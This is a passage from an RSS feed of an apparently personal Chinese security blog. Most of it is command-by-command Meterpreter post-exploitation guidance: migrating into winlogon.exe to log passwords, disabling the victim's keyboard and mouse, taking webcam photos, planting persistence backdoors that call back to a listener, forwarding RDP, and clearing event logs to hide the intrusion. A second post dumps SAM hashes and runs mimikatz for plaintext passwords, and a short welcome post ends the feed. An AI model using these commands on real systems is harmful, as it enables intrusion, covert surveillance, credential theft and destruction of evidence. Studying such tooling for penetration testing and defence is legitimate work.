绑定<br>并在登录进程中捕获键盘记录，以获得用户的密码</p><p>首先，我们需要使用 <code>ps</code> 命令查看目标设备中运行的进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br></pre></td></tr></table></figure><p>使用 <code>getpid</code> 查看我们当前的进程 id</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getpid</span><br></pre></td></tr></table></figure><p>使用 <code>migrate + 目标进程ID</code> 命令来绑定目标进程 id<br>通过进程迁移后<br>当前的 <code>Meterpreter</code> 的 <code>pid</code> 已经和 <code>winlogon.exe</code> 一样了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate 123</span><br></pre></td></tr></table></figure><p>这里绑定目标 <code>pid</code> 的时候，经常会断了 <code>shell</code><br>进程迁移后会自动关闭原来 <code>Meterpreter</code> 进程<br>没有关闭可使用 <code>kill pid</code> 命令关闭进程。</p><p>或者使用自动迁移进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/migrate</span><br></pre></td></tr></table></figure><p>系统会自动寻找合适的进程然后迁移</p><h4 id="禁止目标主机使用键盘鼠标"><a href="#禁止目标主机使用键盘鼠标" class="headerlink" title="禁止目标主机使用键盘鼠标"></a>禁止目标主机使用键盘鼠标</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uictl  <span class="built_in">disable</span>(<span class="built_in">enable</span>) keyboard  <span class="comment">#禁止(允许)目标使用键盘</span></span><br><span class="line">uictl  <span class="built_in">disable</span>(<span class="built_in">enable</span>) mouse     <span class="comment">#禁止(允许)目标使用鼠标</span></span><br></pre></td></tr></table></figure><h4 id="用目标主机摄像头拍照"><a href="#用目标主机摄像头拍照" class="headerlink" title="用目标主机摄像头拍照"></a>用目标主机摄像头拍照</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">webcam_list    <span class="comment">#获取目标系统的摄像头列表</span></span><br><span class="line">webcam_snap    <span class="comment">#从指定的摄像头，拍摄照片</span></span><br><span class="line">webcam_stream  <span class="comment">#从指定的摄像头，开启视频</span></span><br></pre></td></tr></table></figure><h4 id="常用扩展库介绍"><a href="#常用扩展库介绍" class="headerlink" title="常用扩展库介绍"></a>常用扩展库介绍</h4><blockquote><p><code>Meterpreter</code> 中不仅有基本命令还有很多扩展库<br>下面就介绍一下常用的扩展库的查看方法</p></blockquote><h5 id="load-use-命令"><a href="#load-use-命令" class="headerlink" title="load&#x2F;use 命令"></a>load&#x2F;use 命令</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load/use     <span class="comment">#加载模块</span></span><br><span class="line">load -l      <span class="comment">#列出所有可用的扩展</span></span><br><span class="line">load -<span class="built_in">help</span>   <span class="comment">#帮助；说明</span></span><br></pre></td></tr></table></figure><p>命令 <code>load -l</code> 会列出所有可用的扩展</p><p>输入 <code>load</code> 后 <code>双击Tab键</code> 也可以列出可用扩展</p><h5 id="run-命令"><a href="#run-命令" class="headerlink" title="run 命令"></a>run 命令</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run   <span class="comment">#执行一个已有的模块</span></span><br></pre></td></tr></table></figure><p><code>run+双击Tab键</code> 会列出所有的已有的脚本；<br>常用的有 <code>autoroute</code> , <code>hashdump</code> , <code>arp_scanner</code> , <code>multi_meter_inject</code> 等</p><h4 id="生成持续性后门"><a href="#生成持续性后门" class="headerlink" title="生成持续性后门"></a>生成持续性后门</h4><blockquote><p>因为 <code>Meterpreter</code> 是基于 <code>内存DLL</code> 建立的连接<br>所以，只要目标主机关机，我们的连接就会断<br>总不可能我们每次想连接的时候，每次都去攻击<br>然后再利用 <code>Meterpreter</code> 建立连接<br>所以，我们得在目标主机系统内留下一个<code>持续性的后门</code><br>只要目标主机<code>开机</code>了，我们就可以连接到该主机</p></blockquote><p>建立持续性后门有两种方法</p><ul><li>通过启动项启动 <code>persistence</code></li><li>通过服务启动 <code>metsvc</code></li></ul><h5 id="启动项启动"><a href="#启动项启动" class="headerlink" title="启动项启动"></a>启动项启动</h5><p>先使用 <code>Msfvenonm</code> 生成一个后门木马<br>然后放到 <code>windows的启动目录</code> 中</p><blockquote><p>C:\Users$username$\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<br>这样这个后门每次开机就都能启动了<br>然后我们只要相连就监听相应的端口就行了</p></blockquote><h5 id="服务启动"><a href="#服务启动" class="headerlink" title="服务启动"></a>服务启动</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run exploit/windows/local/persistence lhost=192.168.100.132 lport=8888 <span class="comment">#自动连接192.168.100.158的8888端口，缺点是容易被杀毒软件查杀</span></span><br></pre></td></tr></table></figure><p>然后它就在目标机新建了这个文件<br>C:\Windows\TEMP****.vbs<br>并把该服务加入了注册表中<br>只要开机就会启动</p><h4 id="PortFwd-端口转发"><a href="#PortFwd-端口转发" class="headerlink" title="PortFwd 端口转发"></a>PortFwd 端口转发</h4><p><code>portfwd</code> 是 <code>Meterpreter</code> 提供的一种基本的<code>端口转发</code><br><code>porfwd</code> 可以 <code>反弹单个端口</code> 到 <code>本地</code>, 并且 <code>监听</code><br>使用方法如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l 9999 -r 192.168.100.158 -p 3389   </span><br><span class="line"><span class="comment">#将192.168.100.158的3389端口转发到本地的9999端口上，这里的192.168.100.158是获取权限的主机的ip地址</span></span><br><span class="line">-l:   <span class="comment">#本地监听的端口，用于接收目标主机的端口反弹</span></span><br><span class="line">-p:   <span class="comment">#目标服务器的端口；</span></span><br><span class="line">add:  <span class="comment">#添加一个连接</span></span><br></pre></td></tr></table></figure><p>然后我们只要访问<code>本地</code>的 <code>3389</code> 端口就可以连接到<code>目标主机</code>的 <code>3389 </code>端口了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:9999</span><br></pre></td></tr></table></figure><p>如果不想继续连接的话<br>可以删除当前建立的连接<br>执行以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">portfwd delet -l 9999 -r 192.168.100.158 -p 3389   </span><br><span class="line">delet   <span class="comment">#删除一个连接</span></span><br></pre></td></tr></table></figure><h4 id="清除事件日志"><a href="#清除事件日志" class="headerlink" title="清除事件日志"></a>清除事件日志</h4><p>完成攻击操作之后<br>千万别忘了 “打扫战场”<br>我们的所有操作都会被记录在目标系统的日志文件之中<br>因此我们需要在完成攻击之后使用以下命令来清除事件日志</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clearev  <span class="comment">#清除事件日志</span></span><br></pre></td></tr></table></figure><h3 id="导入并执行-PowerShell-脚本"><a href="#导入并执行-PowerShell-脚本" class="headerlink" title="导入并执行 PowerShell 脚本"></a>导入并执行 PowerShell 脚本</h3><p>如果 <code>powershell</code> 脚本是用于域内信息收集的<br>则获取到的权限用户需要是域用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">load powershell                           <span class="comment">#加载powershell功能</span></span><br><span class="line">powershell_import /root/PowerView.ps1      <span class="comment">#导入powershell脚本，提前将该powershell脚本放到指定目录</span></span><br><span class="line">powershell_execute Get-NetDomain           <span class="comment">#执行该脚本下的功能模块Get-domain，该模块用于获取域信息，一个脚本下通常有多个功能模块;获取当前用户所在域的名称;</span></span><br><span class="line">powershell_execute Invoke-UserHunter      <span class="comment">#该功能模块用于定位域管理员登录的主机;</span></span><br><span class="line">powershell_execute Get-NetForest           <span class="comment">#该模块用于定位域信息</span></span><br><span class="line">powershell_execute Invoke-EnumerateLocalAdmin     <span class="comment">#枚举域中所有计算机上本地管理员组的成员</span></span><br></pre></td></tr></table></figure><h3 id="加载-stdapi"><a href="#加载-stdapi" class="headerlink" title="加载 stdapi"></a>加载 stdapi</h3><p>有时候虽然我们获取到了 <code>Meterpreter</code><br>但是执行一些命令会显示没有该命令<br>这时我们可以执行 <code>load stdapi</code> 来加载<br>这样我们就可以执行命令了</p><h3 id="升级-Session"><a href="#升级-Session" class="headerlink" title="升级 Session"></a>升级 Session</h3><p>有时候，当我们收到的不是 <code>Meterpreter</code> 类型的 <code>session</code> 的话<br>可能不好操作，我们可以执行命令 <code>sessions -u id</code> 来升级 <code>session</code><br>执行该命令，默认调用的是 <code>post/multi/manage/shell_to_meterpreter</code> 模块</p>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/Linux/">Linux</category>
      
      <category domain="https://zerospace.dev/tags/%E5%AE%89%E5%85%A8/">安全</category>
      
      
      <comments>https://zerospace.dev/posts/2f26ee9c/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>使用MSF抓取用户密码</title>
      <link>https://zerospace.dev/posts/b034a3f3/</link>
      <guid>https://zerospace.dev/posts/b034a3f3/</guid>
      <pubDate>Wed, 23 Oct 2024 13:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;抓取自动登录的密码&quot;&gt;&lt;a href=&quot;#抓取自动登录的密码&quot; class=&quot;headerlink&quot; title=&quot;抓取自动登录的密码&quot;&gt;&lt;/a&gt;抓取自动登录的密码&lt;/h2&gt;&lt;p&gt;很多用户习惯将计算机设置自动登录&lt;br&gt;可以使用&lt;/p&gt;
&lt;figure class</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="抓取自动登录的密码"><a href="#抓取自动登录的密码" class="headerlink" title="抓取自动登录的密码"></a>抓取自动登录的密码</h2><p>很多用户习惯将计算机设置自动登录<br>可以使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run windows/gather/credentials/windows_autologin</span><br></pre></td></tr></table></figure><p>抓取自动登录的用户名和密码</p><h2 id="导出密码哈希"><a href="#导出密码哈希" class="headerlink" title="导出密码哈希"></a>导出密码哈希</h2><h3 id="run-hashdump-命令"><a href="#run-hashdump-命令" class="headerlink" title="run hashdump 命令"></a>run hashdump 命令</h3><blockquote><p><code>hashdump</code> 模块可以从 <code>SAM数据库</code> 中导出本地用户账号，该命令的使用需要系统权限</p></blockquote><ul><li><p>在 <code>meterpreter_shell</code> 中执行 <code>run hashdump</code> 命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run hashdump</span><br></pre></td></tr></table></figure></li><li><p>用户哈希数据的输出格式为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户名:SID:LM哈希:NTLM哈希:::</span><br></pre></td></tr></table></figure></li><li><p>使用在线网站解密hash密码<br><a href="https://www.cmd5.com/default.aspx">CMD5</a></p></li><li><p><code>run windows/gather/smart_hashdump</code> 命令</p><blockquote><p>使用需要系统权限。该功能更强大<br>如果当前用户是域管理员用户<br>则可以导出域内所有用户的 hash</p></blockquote></li></ul><h2 id="使用-mimikatx-抓取密码"><a href="#使用-mimikatx-抓取密码" class="headerlink" title="使用 mimikatx 抓取密码"></a>使用 mimikatx 抓取密码</h2><h3 id="上传-mimikatz-程序"><a href="#上传-mimikatz-程序" class="headerlink" title="上传 mimikatz 程序"></a>上传 mimikatz 程序</h3><p>我们可以通过上传 <code>mimikatz</code> 程序<br>然后执行 <code>mimikatz</code> 程序来<code>获取明文密码</code></p><ul><li><p>前提<br>执行 <code>mimikatz</code> 必须 <code>System</code> 权限<br>并且在执行时，要根据当前的系统位数进行选择</p></li><li><p>使用方法</p></li></ul><ol><li><p>在 <code>meterpreter_shell</code> 的命令行里面查看当前会话的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getuid</span><br></pre></td></tr></table></figure></li><li><p>查看系统位数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysinfo</span><br></pre></td></tr></table></figure></li><li><p>选择相应位数的 <code>mimikatz</code> 上传至目标服务器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload file  <span class="comment">#upload命令后面需要跟上要上传文件的路径；这个命令是从当前机器上传到目标机器；</span></span><br></pre></td></tr></table></figure></li><li><p>进入 <code>mimikatz</code> 的交互界面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execute -i -f mimikatz.exe</span><br></pre></td></tr></table></figure></li><li><p>在 <code>mimikatz</code> 交互界面，使用以下两条命令抓取密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure></li></ol>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/Linux/">Linux</category>
      
      <category domain="https://zerospace.dev/tags/%E5%AE%89%E5%85%A8/">安全</category>
      
      
      <comments>https://zerospace.dev/posts/b034a3f3/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Hello World</title>
      <link>https://zerospace.dev/posts/4a17b156/</link>
      <guid>https://zerospace.dev/posts/4a17b156/</guid>
      <pubDate>Tue, 22 Oct 2024 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Welcome-To-My-Site&quot;&gt;&lt;a href=&quot;#Welcome-To-My-Site&quot; class=&quot;headerlink&quot; title=&quot;Welcome To My Site&quot;&gt;&lt;/a&gt;Welcome To My Site&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Welcome-To-My-Site"><a href="#Welcome-To-My-Site" class="headerlink" title="Welcome To My Site"></a>Welcome To My Site</h2><ul><li><p>这是我的博客里的第一篇博文，就讲讲建立博客的初心、过程和期望吧。感谢 Asben 的支持和帮助！</p></li><li><p>在很久以前我就想找一个地方记录我的一些思考，所以养成了记录简短日记的习惯</p></li><li><p>今天终于建了个人博客，把我的思考和笔记汇总在这里</p></li><li><p>看了很多大佬们的博客，大部分是关于 IT 编程的各种教程，又受了身边大神在知乎上做科普的启发</p></li><li><p>希望能把自己学过的知识用浅显易懂的语言整理出来</p></li><li><p>希望这个博客能够为一些人提供帮助，并且记录我的个人成长</p></li></ul>]]></content:encoded>
      
      
      
      <category domain="https://zerospace.dev/tags/%E6%9D%82%E8%B0%88/">杂谈</category>
      
      
      <comments>https://zerospace.dev/posts/4a17b156/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
